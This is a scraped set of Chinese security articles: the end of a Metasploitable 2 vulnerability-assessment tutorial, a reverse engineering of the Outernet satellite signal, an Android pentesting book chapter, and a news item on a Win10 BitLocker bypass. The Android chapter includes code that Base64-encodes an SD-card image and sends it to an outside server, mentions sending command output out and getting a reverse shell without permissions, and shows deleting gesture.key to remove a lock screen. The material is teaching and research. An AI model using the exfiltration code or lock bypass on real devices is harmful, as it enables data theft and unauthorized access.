常常不都不自己对其做一些代码或参数上的修改，只有修改成符合我们当前环境的代码，才有可能成功利用到。因此这就要求我们使用者有一定得编程能力和代码的阅读能力。许多安全研究员，为了避免一些脚本小子的恶意使用，往往只提供漏洞的 POC 概念验证代码。小心，我们下载的 exploits ！我们一定要小心从 Exploit-db  以外的地方下载的 exploits ! 你可能会下载到带壳的恶意编码的后门程序，并对你的计算机系统造成隐私及完整性的损害。为了避免这种情况发生，我们不得不对所下载的代码进行一次审计。不久前，我遇到一个 Apache 漏洞，被宣传为零日 exploit ,而且还是最近版本的没有打过补丁的 Apache 。经过对代码的分析，我得知那个 exploit 只是检查当前帐户权限，和格式化整个硬盘驱动器的！CVE Databases另一个非常优秀的漏洞信息查询库是  CVE database  我们可以到以下链接进行查询：https://cve.mitre.org/cve/cve.html当我们查找关于 CVE 2010-2075 的漏洞相关信息后，我们可以看到一个列表为我们列出了报告及相关链接等信息。以帮助我们更好的了解该漏洞及如何利用该漏洞。还有一个漏洞评估信息获取网站， CVE 细节披露网。通过搜索关于 Proftpd 1.3.1 的版本，我们得知了关于该漏洞的，漏洞信息及漏洞风险评估等级等内容。Kali Linux 下的 Searchsploit在 kali 上其实也为我们默认集成了，一款专用于漏洞信息查询的工具 searchsploit 。使用命令如下：searchsploit unreal ircd我们可以使用 cat 命令，来查看其内容：cat /usr/share/exploitdb/platforms/linux/remote/16922.rbOpen-Vas 漏洞扫描器到目前为止，我只介绍了关于使用 Nmap 及手动进行漏洞评估及查询的方法。其实除此之外我们还可以使用高度自动化的扫描器，来进行漏洞的评估发现。例如： Open-Vas 和 Nessus 。这里需要注意的是，使用这类扫描器会产生大量的请求流量，使用不当将会对目标主机产生极大的影响。同时，随意使用扫描器去扫描那些未经授权的主机，是属于违法的行为。我们启动 Open-Vas 漏洞扫描，完成一次完整的扫描，我们需要花点时间等待。之后扫描结果如下：从扫描结果我们可以看到，已经发现许多严重的漏洞。最好我们结合使用多个扫描器进行扫描，这样就能在最大程度上，避免自动化扫描器带来的误报及漏报情况！到此为止，我们就对 Metasploitable 2 做了一次相对全面的漏洞评估。接下来要做的就是如何利用这些漏洞了！","2016-11-08 17:05:57","网络安全","Metasploitable 2系列教程：漏洞评估","http://nsoad.com/Article/Network-security/20161108/721.html"
"5ccbfb484f2f0a0a7a69c142","前言Outernet[1]是一家旨在让访问国际互联网更加方便自由的公司，他们使用卫星来广播维基百科或者其他网站。目前，他们的广播主要使用三颗国际海事卫星[3]的L波段[2]，使其","kong","前言Outernet[1]是一家旨在让访问国际互联网更加方便自由的公司，他们使用卫星来广播维基百科或者其他网站。目前，他们的广播主要使用三颗国际海事卫星[3]的L波段[2]，使其广播覆盖全球，大多数接收机是开源的，可是，他们的关键部分是闭源的，比如二进制的数据分发模式和信号的详细信息。实际上，Outernet可能违反了GPL ，因为他们的sdr100[4]是基于librtl SDR和libmirisdr[5]开发的，而这两个使用了GPL开源协议。详情最近。我逆向了 Outernet 的信号，并完成了一个完全开源的的解码器，他由一个GNU Radio流图 gr-outernet[6]和python脚本free-outernet[7]组成，前者负责获取信号，后者负责提取出传输的文件。在这篇文章中，我将描述GNU Radio是如何工作的还会介绍一些我用来逆向信号的工具和技术。这些技术可以同样应用于其他的类型的信号，特别是用于卫星通讯的信号（逆向结束之后，我才知道它使用了现成的卫星广播通讯方式，Datum Systems M7[8]），你可以在我的博客[9]中找到更多有关于Outernet的信息和其他项目。 处理射频信号的第一步始终都是调整设备的频率和带宽。即使你不知道怎么解调信号，他在瀑布图上，频率和带宽是很明显的。在这里，我使用Scott Chapman（K4KDR）[10]从 I-4 F3卫星上获取的I/Q数据信号，它在美国上空的广播频率是1539.8725 MHz，我们可以清楚的看见带宽大概是4.8kHz。如果你运行下面的流图，将会看到输出。我们如果只看这些，基本对信号一无所知，他看起来像一个4.8khz的宽峰噪音，正如 Phil Karn （KA9Q）[11]所说：“任何一个先进的通讯方案都无法区别噪音。”因为它是一个窄带卫星信号，我们猜测它使用的是PSK方式调制的，但是采用的BPSK还是QPSK？这两种都是有可能的。有一种简单的方式可以猜测PSK的类型而不用把它恢复到星图。这个方法是：首先，我们把信号功率提升到2倍（源信号乘以本身），如果我们发现了直流成分，那么这个是BPSK信号，如果没有，我们提升到4倍，如果这时产生直流成分，那么是QPSK信号。这也适用于高阶PSK信号（不适用于QAM），对于一个M-PSK信号来说，提升一个整数倍m时，会产生直流成分。你可以看下面的流程，当提升2倍时，出现来直流脉冲，这表明，Outernet是BPSK信号。下面的任务是获取信号的波特率，有一种叫循环平稳分析的方法可以用来获取信号的波特率。使用延时之后的信号复共轭相乘。最好的解释方式就是看下面的流图。循环平稳分析的输出显示来一个特定频率下的波特率频率分量，在下面的图中，我们可以看到在4200hz处有分量，这表明，波特率是4.2kbaud。频率图中的高平均是很重要的，否则4200hz的频率分量是很难看到的。现在，我们知道了波特率，我们可以把它恢复成星图，发现它确实是BPSk信号，有关于PSK的解调[12]，GNU Radio入门介绍网页[13]有一篇很好的说明。下面，你可以看到我们的BPSK解调器流图和星图，正如预期，这是一个BPSK信号。Outernet对外所说比特率约为2 kbps，或为20MB每天，而我们分析得到的比特率是4.2kbaud，所以，很有可能它使用了r=1/2正向纠错编码，参数r被称为速率，    R = 1 / 2意味着数据流使用了1/2bits用来在接收器中纠正错误位，实际速率只有我们测得速率的一半，也就是2.1kbps。对于参数是r=1/2的数据，最流行的是使用国际空间数据系统咨询委员会提出的，r=1/2,卷积码K = 7的协议式。针对这种编码的Viterbi解码器在GNU radio中有相应的模块，叫做“Decode CCSDS 27”。然而，这种编码允许在几个变量上有所更改。我们可以使用Balint Seeber[14]的Auto FEC[15]监视Viterbi译码器的误码率并尝试不同的组合参数，直到发现一个可以正常使用的组合。 Auto FEC也可以删余一些数据（超过1/2的部分）。实际上，你很可能不知道它使用了何种删余率，因为变化太多了。如果想使用Auto FEC，你需要在GNU Radio上打一个补丁，因为 Viterbi 解码器和 “Decode CCSDS 27”模块需要修改以便输出误码率。在这里[16]，你可以找到一个用于GNU Radio当前版本的补丁（3.7.10.1测试版），同样，Auto FEC需要输入的是QPSK信号，这有一个补丁[17]可以让他与BPSK 信号工作。从下面的流图，你可以看到Auto FEC的运行和他的输出，Auto FEC在控制台上打印各种组合，以尝试得到正确的参数。在这个输出中，需要注意的是把  “Viterbi swap”设置为true。他的含义是在CCSDS编码这个特定的环境中，多项式的数值是交换的。通常，A决定第一位，B 决定第二位。而在这里，第一位来自B，而第二位来自A。为了抵消这一点，我们需要交换每对数据，再把他们送入CCSDS协议解码器。现在，我们实现了一个 Viterbi 译码器并检查了它的工作。“Swap”模块是一个自定义的模块，它交换每一对浮点数。对于BPSK信号，我们要把两个Viterbi译码器放在输入流上，其中一个比另一个延后一个样本，因为我们不知道刚开始捕获数据的时候，是一对数据的第一个还是第二个。你可能会看到如下的输出，其中metric变量表示Viterbi解码器的误码率，当误码率很低的时候metric变量很高，而且几乎有一个恒定的数值，相反，如果解码器没有工作，metric值会很低，并具有类似随机的值。当然，两个译码器只有一个正常工作。当BPSK解调错过一个值或者插入来一个值，（样本流多了或者少了一个bit），这两个Viterbi解码器的工作状态（是否工作正常）就会交换，如果信号质量好，不应该发生这种情况，在这个过程中，是由于树木在风中的移动干扰来信号。另外一个有趣的尝试是关闭“Swap”模块，这样的话两个Viterbi解码器都不会正常工作了。现在，我们对Viterbi译码器是否工作很有信心，我们接下来把数据流放入raster图，观察是否使用了扰频器，如果使用了，数据流会看起来随机化，如果没有，我们会看到一些比特流的特有结构，实际上，我们基本已经确定它使用了扰频器，因为我们之前看到的BPSK信号很像噪声，而不是展现BPSK的特有频谱结构。正如你下面看到的，比特流的出现是随机的，所以我们还需要一个解扰器。选择正确的解扰器是很困难的，因为我们没有办法去猜测它的算法，如果您知道它使用来那种卫星调制解调器，请尝试它支持的所有算法，如果您不知道，那就尝试所有流行的算法。这一步通常需要大量的试验和错误。然而，如果选用正确来，效果也是很明显的，你可你看到他的输出比特流结构，如果不对，输出还是随机的。最常用的一种是G3RUH的复数乘法器（它用于9.6kbaud业余无线电组和几个业余卫星），数据可以使用GNU  radio中的 “Descrambler” 模块加扰，它使用0x21作为掩码，长度为16    ，这个模块的参数选择很麻烦，详见我的博客。[18]在这种情况中，G3RUH加扰器是无法工作的。有这样的事实，我们的二进制代码要传递给寄存器进行处理， sdr100在Outernet的软件中作为sdr接收器，那么，他只可能是基于ARM或者86-64架构上运行的Linux操作系统，而最新的软件版本只对arm进行支持，所以，Outernet上用于接收的部分应该是像树莓派3一样的arm板。我对x86-64架构下的客户端程序中的sdr100二进制文件进行了逆向，来获取Outernet解扰算法，原来，这是 IESS-30解码器，很显然，这个算法的详细细节在卫星地球站的文档中没有公开。但是，我还是找到了一个文档[19]（见28页），里面的描述有助于我的逆向。我设计了一个模块用于 IESS-308 解码，您可以在这里[20]看到这个模块的代码。如果你熟悉乘法加扰器，你会发现这个加扰器很普通，但是，它用了一个计数器。下面的流图可以测试我们的 IESS-308 解码器输入流显示出了很明显的结构，所以我们有信心，这个解码器是正常的。你可以看到一些白色和青色的水平线，这符合长时间连续二进制0,1传输的特征。这张图中的每行每列的水平线的数量和分布代表着二进制的数据，如果把它们垂直摆放在一条线上，看起来可能更明显，我们会很容易发现什么数据是不改变的（例如报文头）或者改变的（例如数据段）。在这条推文中[21]，你可以看到进行如上工作的一个例子。下一步工作是解帧，通常，我们可以通过仔细观察比特流来识别帧标记，但是，在这里我们可以通过逆向sdr100二进制代码的方式减轻工作量。sdr100中，有一些函数的名称中含有HDLC，所以我们猜测可能是使用来HDLC帧，我们尝试从数据流中恢复HDLC帧。GNU Radio中，提供了用于解HDLC帧的模块，但是，我准备用我自己的gr-kiss[22]模块。这个模块的好处是可以去保留CRC码校验错误的数据帧。有的时候，可能一个数据帧只有几个bit是错误的，他就被完全丢弃了。然而，保留CRC校验错误的帧对于逆向协议和分析测试是很有用的。有时候，HDLC帧会有几个bit的错误，那可能是因为干扰或者解码器参数没有优化，也有可能碰巧只有16位的CRC码出现了错误。在这种情况下，保留错误帧也是很有用的。到现在为止，我们还没有考虑信号的极性，在接受 BPSK信号的时候，你不知到他是一个原始信号还是一个翻转信号（即0,1的互换），是否进行了180度的相位翻转是模糊的，很多时候，采用差分编码来消除这种模糊性。HDLC 可能采用的是NRZ-I，也可能没有采用差分编码，而采用其他方式消除模糊，这又是一个实验和试错的过程。实际上，Outernet不使用任何一种差分编码，因此我们需要一个正置的数据流和一个反置的数据流，只有一个可以正常工作，但是我们实现不知道是哪一个。（当我们失去信号之后，下一次连接，它可能改变。）下面是HDLC解帧的流图，“Invert bit”是一个自定义的模块，他的功能就是进行位翻转。也可以使用程序提供的模块实现这一功能。下面，我把两个HDLC解帧模块连接在数据流上，在其中一个前面进行位翻转。当我们运行这个流图之后，在控制台上会看到数据帧的出现。因为我们开启了CRC检查，所以我们确信我们的接收机可以正常工作。毕竟，如果我们在处理的时候有错误，是不可能出现这么多通过CRC校验的数据帧。我们GNU Radio阶段的任务就完成了，一旦提取了HDLC数据帧，就需要使用free-outernet[23]这个Python脚本进行UDP发送，或者把它们存在一个文件里。free-outernet会回复被传输的文件，它还会打印一些有趣的调试和技术信息。下面你可以看到脚本可以恢复的两个文件，e89f-messages-0.html.tbz2包含了用于业余无线电的APRS[25]信息，和ed57-amazon.com.html.tbz2，其中包含亚马逊的维基百科网页[26]。大部分的文件是以tbz2压缩格式发送的。另一个有趣的事情是，每分钟，会有一个时间数据包。这用来更新接收器的时钟信号，因为使用的是小型ARM，所以没有真实的时钟或者网络连接。提取文件后，我们可以在Web浏览器中打开亚马逊的维基百科页面。这页是一个HTML文件，其中包含CSS样式表和图片。它为独立的查看而进行了小尺寸优化，所以所有的超链接已被删除。对广播文件协议的介绍超出了本文的范围，你可以在我的博客[27]中找到完整的描述。我唯一不能逆向的是使用了应用级FEC的LDPC编码。它可以使接受程序在一些数据帧错误的情况下恢复文件，由于LDPC码的译码没有实现，所以你需要获取一个文件所有的数据帧才能使用我们的脚本恢复，你可以看到github上有关于LDPC的进展[28]。","2016-11-14 11:54:21","网络安全","针对Outernet卫星信号的逆向工程","http://nsoad.com/Article/Network-security/20161114/763.html"
"5ccbfb484f2f0a0a7a69c143","Android 是当今最流行的智能手机操作系统之一。 随着人气的增加，它存在很多安全风险，这些风险不可避免地被引入到应用程序中，使得用户本身受到威胁。","Aditya Gupta","本文来源：看雪学院  编译作者：飞龙使者   原文出自：Learning Pentesting for Android Devices  网络攻防小组Kong.整理发布Android 是当今最流行的智能手机操作系统之一。 随着人气的增加，它存在很多安全风险，这些风险不可避免地被引入到应用程序中，使得用户本身受到威胁。 我们将在本书中以方法论和循序渐进的方式来讨论 Android 应用程序安全性和渗透测试的各个方面。本章的目标是为 Android 安全打下基础，以便在以后的章节中使用。1.1 Android 简介自从 Android 被谷歌收购（ 2005 年） ，谷歌已经完成了整个开发，在过去的 9 年里，尤其是在安全方面，有很多变化。 现在，它是世界上最广泛使用的智能手机平台，特别是由于不同的手机制造商，如 LG，三星，索尼和 HTC 的支持。 Android 的后续版本中引入了许多新概念，例如 Google Bouncer 和 Google App Verifier。 我们将在本章逐一介绍它们。如果我们看看 Android 的架构，如下图所示，我们将看到它被分为四个不同的层。 在它的底部是 Linux 内核，它已被修改来在移动环境中获得更好的性能。 Linux 内核还必须与所有硬件组件交互，因此也包含大多数硬件驱动程序。 此外，它负责 Android 中存在的大多数安全功能。 由于 Android 基于 Linux 平台，它还使开发人员易于将 Android 移植到其他平台和架构。 Android 还提供了一个硬件抽象层，供开发人员在 Android 平台栈和他们想要移植的硬件之间创建软件钩子。在 Linux 内核之上是一个层级，包含一些最重要和有用的库，如下所示：Surface Manager：管理窗口和屏幕 媒体框架：这允许使用各种类型的编解码器来播放和记录不同的媒体 SQLite：这是一个较轻的 SQL 版本，用于数据库管理 WebKit：这是浏览器渲染引擎 OpenGL：用于在屏幕上正确显示 2D 和 3D 内容以下是来自 Android 开发人员网站的 Android 架构的图形表示：Android 中的库是用 C 和 C++ 编写的，其中大多数是从 Linux 移植的。 与 Linux 相比，Android 中的一个主要区别是，在这里没有 libc 库，它用于 Linux 中的大多数任务。 相反，Android 有自己的称为 bionic 的库，我们可以认为它是一个剥离和修改后的，用于 Android的 libc 版本。在同一层级，还有来自 Android 运行时 -- Dalvik 虚拟机和核心库的组件。 我们将在本书的下一部分中讨论关于 Dalvik 虚拟机的很多内容。在这个层之上，有应用程序框架层，它支持应用程序执行不同类型的任务。此外，开发人员创建的大多数应用程序只与第一层和最顶层的应用程序交互。 该架构以一种方式设计，在每个时间点，底层都支持上面的层级。早期版本的 Android（&lt;4.0） 基于 Linux 内核 2.6.x，而较新版本基于内核 3.x. 不同的Android 版本和他们使用的 Linux 内核的列表规定如下：Android 中的所有应用程序都在虚拟环境下运行，这称为 Dalvik 虚拟机（ DVM） 。 这里需要注意的一点是，从 Android 4.4 版本开始，还有另一个运行时称为 Android 运行时（ ART） ，用户可以在 DVM 和 ART 运行时环境之间自由切换。然而，对于这本书，我们将只关注 Dalvik 虚拟机实现。 它类似于 Java 虚拟机（ JVM） ，除了基于寄存器的特性，而不是基于堆栈的特性。 因此，运行的每个应用程序都将在自己的 Dalvik 虚拟机实例下运行。 因此，如果我们运行三个不同的应用程序，将有三个不同的虚拟实例。 现在，这里的重点是，即使它为应用程序创建一个虚拟环境来运行，它不应该与安全容器或安全环境混淆。 DVM 的主要焦点是与性能相关，而不是与安全性相关。Dalvik 虚拟机执行一个名为 .dex 或 Dalvik 可执行文件的文件格式。 我们将进一步查看 .dex 文件格式，并将在下面的章节中进行分析。 现在让我们继续与 adb 进行交互，并更深入地分析 Android 设备及其体系结构。1.2 深入了解 Android如果你有 Android 设备或正在运行Android模拟器，则可以使用 Android SDK 本身提供的工具（ 称为 adb） 。 我们将在第二章详细讨论 adb。 现在，我们将只设置 SDK，我们已经准备好了。一旦设备通过 USB 连接，我们可以在我们的终端中输入 adb，这将显示所连接设备的序列号列表。 请确保你已在设备设置中启用了 USB 调试功能。$ adb devicesList of devices attachedemulator-5554 device现在，如我们之前所见，Android 是基于 Linux 内核的，所以大多数 Linux 命令在 Android 上也可以通过 adb shell 完美运行。 adb shell 为你提供与设备的 shell 直接交互，你可以在其中执行命令和执行操作以及分析设备中存在的信息。 为了执行 shell，只需要键入以下命令：adb shell.一旦我们在 shell 中，我们可以运行 ps 为了列出正在运行的进程：如你所见， ps 将列出当前在 Android 系统中运行的所有进程。 如果仔细看，第一列制定了用户名。 在这里我们可以看到各种用户名，如system ， root ， radio 和一系列以 app_ 开头的用户名。 正如你可能已经猜到的，以system 名称运行的进程由系统拥有， root 作为根进程运行， radio 是与电话和无线电相关的进程， app_ 进程是用户已下载的所有应用程序，安装在他们的设备上并且当前正在运行。 因此，就像在 Linux 中用户确定了当前登录到系统的唯一用户一样，在 Android 中，用户标识了在自己的环境中运行的应用/进程。所以，Android 安全模型的核心是 Linux 特权分离。 每次在 Android 设备中启动新应用程序时，都会为其分配唯一的用户 ID（ UID） ，该用户 ID 将之后会属于某些其他预定义组。与 Linux 类似，用作命令的所有二进制文件都位于 /system/bin 和 /system /xbin 。 此外，我们从 Play 商店或任何其他来源安装的应用程序数据将位于 /data/data ，而其原始安装文件（ 即 .apk ） 将存储在 /data/app 。 此外，还有一些应用程序需要从 Play 商店购买，而不是只是免费下载。 这些应用程序将存储在 /data/app-private/ 。Android 安装包（ APK） 是 Android 应用程序的默认扩展名，它只是一个归档文件，包含应用程序的所有必需文件和文件夹。 我们在后面的章节中将继续对 .apk 文件进行逆向工程。现在，让我们访问 /data/data ，看看里面有什么。 这里需要注意的一点是，为了在真实设备上实现，设备需要 root 并且必须处于 su 模式：# cd /data/data# lscom.aditya.facebookappcom.aditya.spinnermenucom.aditya.zeropermissioncom.afe.socketappcom.android.backupconfirmcom.android.browsercom.android.calculator2com.android.calendarcom.android.cameracom.android.certinstallercom.android.classiccom.android.contactscom.android.customlocale2所以，我们可以在这里看到，例如， com.aditya.facebookapp ，是单独的应用程序文件夹。现在，你可能会想知道为什么它是用点分隔的单词风格，而不是常见的文件夹名称，如 FacebookApp 或 CameraApp 。 因此，这些文件夹名称指定各个应用程序的软件包名称。 软件包名称是应用程序在 Play 商店和设备上标识的唯一标识符。 例如，可能存在具有相同名称的多个相机应用或计算器应用。 因此，为了唯一地标识不同的应用，使用包名称约定而不是常规应用名称。如果我们进入任何应用程序文件夹，我们会看到不同的子文件夹，例如文件（files ） ，数据库（databases ） 和缓存（cache ） ，稍后我们将在第 3 章“逆向和审计 Android 应用程序”中查看。shell@android:/data/data/de.trier.infsec.koch.droidsheep # lscachedatabasesfileslibshell@android:/data/data/de.trier.infsec.koch.droidsheep #这里需要注意的一个重要的事情是，如果手机已经 root，我们可以修改文件系统中的任何文件。 对设备获取 root 意味着我们可以完全访问和控制整个设备，这意味着我们可以看到以及修改任何我们想要的文件。最常见的安全保护之一是大多数人都想到的是模式锁定或 pin 锁，它默认存在于所有Android手机。 你可以通过访问 Settings | Security | Screen Lock 来配置自己的模式。一旦我们设置了密码或模式锁定，我们现在将继续，将手机与 USB 连接到我们的系统。 现在，密码锁的密钥或模式锁的模式数据以名称 password.key 或 gesture.key 存储在 /data/system 。 注意，如果设备被锁定，并且 USB 调试被打开，你需要一个自定义引导加载程序来打开 USB 调试。 整个过程超出了本书的范围。 要了解有关 Android 的更多信息，请参阅 Thomas Cannon Digging 的 Defcon 演示。因为破解密码/模式将更加艰难，并且需要暴力（ 我们将看到如何解密实际数据） ，我们将简单地继续并删除该文件，这将从我们手机中删除模式保护 ：shell@android:/data # cd /data/systemshell@android:/data/system # rm gesture.key所以，我们可以看到，一旦手机被 root ，几乎任何东西都可以只用手机、一根USB电缆和一个系统来完成。 我们将在本书的后续章节中更多地了解基于 USB 的利用。1.3 沙箱和权限模型为了理解 Android 沙箱，让我们举一个例子，如下图：如前图所示和前面所讨论的，Android 中的每个应用程序都在其自己的 Dalvik 虚拟机实例中运行。 这就是为什么，无论何时任何应用程序在我们的设备中崩溃，它只是显示强制关闭或等待选项，但其他应用程序继续顺利运行。 此外，由于每个应用程序都在其自己的实例中运行，因此除非内容提供者另有规定，否则将无法访问其他应用程序的数据。Android 使用细粒度的权限模型，这需要应用程序在编译最终应用程序包之前预定义权限。你必须注意到，每次从 Play 商店或任何其他来源下载应用程序时，它会在安装过程中显示一个权限屏幕，它类似于以下屏幕截图：此权限屏幕显示应用程序可以通过手机执行的所有任务的列表，例如发送短信，访问互联网和访问摄像头。 请求多于所需的权限使应用程序成为恶意软件作者的更具吸引力的目标。Android 应用程序开发人员必须在开发应用程序时在名为 AndroidManifest.xml 的文件中指定所有这些权限。 此文件包含各种应用程序相关信息的列表，例如运行程序所需的最低Android 版本，程序包名称，活动列表（ 应用程序可见的应用程序中的界面） ，服务（ 应用程序的后台进程） ，和权限。 如果应用程序开发人员未能在 AndroidManifest.xml 文件中指定权限，并仍在应用程序中使用它，则应用程序将崩溃，并在用户运行它时显示强制关闭消息。一个正常的 AndroidManifest.xml 文件看起来像下面的截图所示。 在这里，你可以使用 标记和其他标记查看所需的不同权限：如前所述，所有 Android 应用程序在安装后首次启动时都会分配一个唯一的 UID。 具有给定UID 的所有用户都属于特定组，具体取决于他们请求的权限。 例如，一个仅请求 Internet 权限的应用程序将属于 inet 组，因为 Android 中的 Internet 权限位于 inet 组下。用户（ 在这种情况下的应用程序） 可以属于多个组，具体取决于他们请求的权限。 或者换句话说，每个用户可以属于多个组，并且每个组可以具有多个用户。 这些组具有由组ID（ GID） 定义的唯一名称。 然而，开发人员可以明确地指定其他应用程序在与第一个相同的 UID 下运行。 在我们的设备中，其中的组和权限在文件 platform.xml 中指定，它位于 /system/etc/permissions/ ：shell@grouper:/system/etc/permissions $ cat platform.xml. . . . . . [Some of the data has been stripped from here in order to shorten the output and make it readable]此外，这清除了对在 Android 设备中运行的本地应用程序的怀疑。 由于本地应用程序直接与处理器交互，而不是在 Dalvik 虚拟机下运行，因此它不会以任何方式影响整体安全模型。现在，就像我们在前面部分看到的，应用程序将其数据存储在 location/data/data/[package name] 。 现在，存储应用程序数据的所有文件夹也具有相同的用户 ID，这构成 Android 安全模型的基础。 根据 UID 和文件权限，它将限制来自具有不同 UID 的其他应用程序对它的访问和修改。在下面的代码示例中， ret 包含以 Base64 格式编码存储在的 SD 卡中的图像，现在正在使用浏览器调用来上传到 attify.com 网站。 目的只是找到一种方式来在两个不同的 Android 对象之间进行通信。我们将首先创建一个对象来存储图像，在Base64 中编码，最后将其存储在一个字符串中 imageString ：final File file = new File(""/mnt/sdcard/profile.jpg""); Uri uri = Uri.fromFile(file); ContentResolver cr = getContentResolver(); Bitmap bMap=null; try { InputStream is = cr.openInputStream(uri); bMap = BitmapFactory.decodeStream(is); if (is != null) { is.close(); } } catch (Exception e) { Log.e(""Error reading file"", e.toString()); } B yteArrayOutputStream baos = new ByteArrayOutputStream(); bMap.compress(Bitmap.CompressFormat.JPEG, 100, baos); byte[] b = baos.toByteArray(); String imageString = Base64.encodeToString(b,Base64.DEFAULT);最后，我们将启动浏览器将数据发送到我们的服务器，我们有一个 .php 文件侦听传入的数据：startActivity(new Intent(Intent.ACTION_VIEW,Uri.parse(""http://attify.com/up.php?u=""+im ageString)));我们还可以执行命令并以相同的方式将输出发送到远程服务器。 但是，这里需要注意的一点是 shell 应该在应用程序的用户下运行：// To execute commands : String str = ""cat /proc/version""; //command to be executed is stored in str. process = Runtime.getRuntime().exec(str);这是一个有趣的现象，因为攻击者可以获得一个反向 shell（ 这是一个从设备到系统的双向连接，可以用于执行命令） ，而不需要任何类型的权限。1.4 应用签名应用程序签名是 Android 的独特特性之一，由于其开放性和开发人员社区，它取得了成功。Play 商店中有超过一百万个应用。 在 Android 中，任何人都可以通过下载 Android SDK 创建 Android 应用，然后将其发布到 Play 商店。 通常有两种类型的证书签名机制。 一个是由管理证书颁发机构（ CA） 签名的，另一个是自签名证书。 没有中间证书颁发机构（ CA） ，而开发人员可以创建自己的证书并为应用程序签名。在 Apple 的 iOS 应用程序模型中可以看到 CA 签名，其中开发者上传到 App Store 的每个应用程序都经过验证，然后由 Apple 的证书签名。 一旦下载到设备，设备将验证应用程序是否由 Apple 的 CA 签名，然后才允许应用程序运行。但是，在 Android 中是相反的。 没有证书颁发机构; 而是开发人员的自创建证书可以签署应用程序。 应用程序上传完成后，会由 Google Bouncer 进行验证，这是一个虚拟环境，用于检查应用程序是否是恶意或合法的。 检查完成后，应用就会显示在 Play 商店中。 在这种情况下，Google 不会对该应用程序进行签名。 开发人员可以使用 Android SDK 附带的工具（ 称为 keytool ） 创建自己的证书，或者使用 Eclipse 的 GUI 创建证书。因此，在 Android 中，一旦开发人员使用他创建的证书签名了应用程序，他需要将证书的密钥保存在安全的位置，以防止其他人窃取他的密钥并使用开发人员的证书签署其他应用程序。 如果我们有一个 Android 应用程序（.apk ） 文件，我们可以检查应用程序的签名，并找到使用称为 jarsigner 的工具签署应用程序的人，这个工具是 Android SDK 自带的：$ jarsigner -verify -certs -verbose testing.apk以下是在应用程序上运行上述命令并获取签名的信息的屏幕截图：此外，解压缩 .apk 文件后，可以解析 META-INF 文件夹中出现的 CERT.RSA 文件的 ASCII 内容，以获取签名，如以下命令所示：$ unzip testing.apk $ cd META-INF $ openssl pkcs7 -in CERT.RSA -print_certs -inform DER -out out.cer $ cat out.cer这在检测和分析未知的 Android .apk 示例时非常有用。 因此，我们可以使用它获得签署人以及其他详细信息。1.5 Android 启动流程在 Android 中考虑安全性时最重要的事情之一是 Android 启动过程。 整个引导过程从引导加载程序开始，它会反过来启动 init 过程 - 第一个用户级进程。所以，任何引导加载程序的变化，或者如果我们加载另一个，而不是默认存在的引导加载程序，我们实际上可以更改在设备上加载的内容。 引导加载程序通常是特定于供应商的，每个供应商都有自己的修改版本的引导加载程序。 通常，默认情况下，此功能通过锁定引导加载程序来禁用，它只允许供应商指定的受信任内核在设备上运行。 为了将自己的 ROM 刷到Android 设备，需要解锁引导加载程序。 解锁引导加载程序的过程可能因设备而异。 在某些情况下，它也可能使设备的保修失效。注 在Nexus 7 中，它就像使用命令行中的 fastboot 工具一样简单，如下所示：$ fastboot oem unlock在其他设备中，可能需要更多精力。 我们看看如何创建自己的 Bootloader 并在本书的后续章节中使用它。回到启动过程，在引导加载程序启动内核并启动 init 之后，它挂载了 Android 系统运行所需的一些重要目录，例如 /dev ， /sys 和 /proc 。 此外， init 从配置文件 init.rc 和 init.[device-name].rc 中获取自己的配置，在某些情况下从位于相同位置的 .sh 文件获取自己的配置。如果我们对 init.rc 文件执行 cat ，我们可以看到 init 加载自身时使用的所有规范，如下面的截图所示：init 进程的责任是启动其他必需的组件，例如负责 ADB 通信和卷守护程序（ vold） 的 adb守护程序（ adbd） 。加载时使用的一些属性位于 build.prop ，它位于 location/system 。 当你在 Android 设备上看到 Android logo 时，就完成了 init 进程的加载。 正如我们在下面的截图中可以看到的，我们通过检查 build.prop 文件来获取设备的具体信息：一旦所有的东西被加载， init 最后会加载一个称为 Zygote 的进程，负责以最小空间加载Dalvik 虚拟机和共享库，来加快整个进程的加载速度。 此外，它继续监听对自己的新调用，以便在必要时启动更多 DVM。 这是当你在设备上看到 Android 开机动画时的情况。一旦完全启动，Zygote 派生自己并启动系统，加载其他必要的 Android 组件，如活动管理器。 一旦完成整个引导过程，系统发送 BOOT_COMPLETED 的广播，许多应用程序可能使用称为广播接收器的 Android 应用程序中的组件来监听。 当我们在第 3 章“逆向和审计 Android 应用程序”中分析恶意软件和应用程序时，我们将进一步了解广播接收器。总结在本章中，我们为学习 Android 渗透测试建立了基础。 我们还了解 Android 的内部结构及其安全体系结构。在接下来的章节中，我们将建立一个 Android 渗透测试实验室，并使用这些知识执行更多的技术任务，来渗透 Android 设备和应用程序。 我们还将了解有关 ADB 的更多信息，并使用它来收集和分析设备中的信息。","2017-02-25 13:39:18","移动安全","Android 渗透测试学习手册（一）Android 安全入门","http://nsoad.com/Article/MobileSecurity/20170225/1081.html"
"5ccbfb484f2f0a0a7a69c144","最近，安全专家Sami Laiho发现了一种绕过BitLocker限制，获取Win10系统控制权的方法：当Win10在更新并安装相关系统版本时，长按SHIFT+F10键，将会打开CMD命令行控制界面！","kong","最近，安全专家Sami Laiho发现了一种绕过BitLocker限制，获取Win10系统控制权的方法：当Win10在更新并安装相关系统版本时，长按SHIFT+F10键，将会打开CMD命令行控制界面！而据Sami Laiho透露，这是一个存在很久的问题，微软已于1个月前确认其告知的漏洞并开始制作补丁。演示视频：http://v.youku.com/v_show/id_XMTg0MjQ5MjE1Mg==.html(高清视频：百度盘）http://v.youku.com/v_show/id_XMTg0MjQ5MjE1Mg==.html漏洞原因：该漏洞原因在于，Windows 10在系统更新过程中，当安装Windows PE镜像时，操作系统会关闭BitLocker功能。影响版本：至10月底，该漏洞影响几乎所有Windows10版本系统。攻击场景：使用者在电脑更新时离开，攻击者可以趁机利用该漏洞执行恶意操作。当然，这种方法，对警察进行计算机取证，或是小偷盗取电脑时，或许都能发挥作用。Laiho强调，因为Windows10的更新是强制进行的，所以对普通用户来说，这确实是一个很大的安全威胁，而针对一些大型企业的长期服务版本（Long TimeService Branch），由于不能自动安装更新，这种攻击威胁的可能性较小。","2016-12-01","漏洞发布","Win10攻击神技巧：系统更新时长按 SHIFT+F10 键可以打开CMD界面","http://nsoad.com/Article/exploit/20161201/vulzone-41.html"
